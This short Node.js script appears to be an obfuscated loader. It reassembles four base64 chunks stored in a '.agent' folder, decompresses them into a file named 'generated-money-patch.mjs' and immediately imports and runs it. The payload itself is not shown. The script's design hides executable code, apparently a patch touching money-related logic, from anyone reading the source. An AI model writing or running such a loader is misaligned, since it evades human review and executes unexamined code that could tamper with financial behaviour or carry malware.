import { gunzipSync } from 'node:zlib';
import { readFileSync, writeFileSync } from 'node:fs';
import { pathToFileURL } from 'node:url';

const encoded = [0, 1, 2, 3]
  .map((index) => readFileSync(`.agent/chunk-${String(index).padStart(2, '0')}.txt`, 'utf8').trim())
  .join('');
const generated = '.agent/generated-money-patch.mjs';
writeFileSync(generated, gunzipSync(Buffer.from(encoded, 'base64')));
await import(pathToFileURL(generated).href);
